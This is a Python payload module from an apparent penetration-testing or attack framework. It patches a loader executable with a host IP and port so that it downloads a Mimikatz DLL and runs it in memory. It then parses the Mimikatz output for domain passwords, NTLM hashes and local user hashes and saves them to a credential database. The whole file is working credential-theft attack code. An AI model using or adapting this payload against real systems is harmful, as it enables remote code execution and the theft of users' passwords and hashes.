import sys
import os
import re
import hashlib
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
from utils.db import DB
from utils.output import Output
from server.ressources import get_ressource_md5, powershell_encode_base64

class Payload:
    name = 'loader_mimikatz_dll_x64'
    type = 'cmd'
    args = ['ip:http_port']
    filename = 'loader_x64.exe'
    md5 = hashlib.md5(b'loader_mimikatz_dll_x64')

    def generate_payload(self, ip_port):
        # Mimikatz in memory
        arch = "x64"

        mimikatz_md5 = get_ressource_md5('mimikatz_%s.dll' % arch)

        # create it

        loader_file = open(os.path.join(os.path.dirname(__file__), "..", "ressources", self.filename), "rb")
        binary = loader_file.read()
        loader_file.close()

        ip = ip_port.split(':')[0]
        port = ip_port.split(':')[-1]
        # replace
        binary = self.replace(binary, b"IP@@@@@@@@@@@@@@@@@@@@@@@@@", ip) 
        binary = self.replace(binary, b"PORT@@@@@", port) 
        binary = self.replace(binary, b"URI_DLL@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "/ressources/%s" % mimikatz_md5) 
        binary = self.replace(binary, b"URI_RES@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "/ressources/%s" % self.md5) 
        binary = self.replace(binary, b"FUNCTION@@@@@@@@@@@@@@@@", "launch") 

        return binary

    def replace(self, binary, pattern, value):
        value = value.encode()

        binary = binary.replace(pattern, value + b"\x00"*(len(pattern) - len(value)))

        return binary        

    def process_output(self, file_path):

        # Retrieve IP from filename
        filename = os.path.basename(file_path)
        ip = filename.split('_')[-2]

        user = {
            'ip': ip,
        }

        f = open(file_path)
        for line in f:
            line = line.strip()

            m = re.match('^\s*\*\s+(Username|Domain|NTLM|Password)\s+:\s+(.+)\s*$', line)
            if m:
                key = m.group(1)
                value = m.group(2)

                if key == 'Username':
                    user['username'] = value
                elif key == 'Domain':
                    user['domain'] = value
                elif key == 'Password':
                    user['type'] = 'password'
                    user['password'] = value

                    if user['username'] != '(null)' and user['domain'] != '(null)' and user['password'] != '(null)':
                        if not user['username'].endswith('$'):
                            Output.major('New user password: {domain}\\{username}:{password}'.format(**user))
                            DB.insert_domain_credential(user)

                    user = {
                        'ip': ip,
                    }
                elif key == 'NTLM':
                    user['type'] = 'hash'
                    user['format'] = 'ntlm'
                    user['hash'] = value

                    if user['username'] != '(null)' and user['domain'] != '(null)' and user['hash'] != '(null)':
                        if not user['username'].endswith('$'):
                            Output.major('New user hash: {domain}\\{username}:{hash}'.format(**user))
                            DB.insert_domain_credential(user)

                    user = {
                        'ip': ip,
                    }

            m = re.match('^\s*(User|Hash NTLM)\s*:\s+(.+)\s*$', line)
            if m:
                key = m.group(1)
                value = m.group(2)

                if key == 'User':
                    user['username'] = value
                elif key == 'Hash NTLM':
                    user['hash'] = value
                    Output.major('New local user hash: {ip} {username}:{hash}'.format(**user))

                    cred_info = {
                        'hostname': ip,
                        'port': 445,
                        'service': 'smb',
                        'url': 'smb://%s:445' % ip,
                        'type': 'hash',
                        'format': 'ntlm',
                        'username': user['username'],
                        'hash': user['hash'],
                    }
                    DB.insert_credential(cred_info)

                    user = {
                        'ip': ip,
                    }

        f.close()
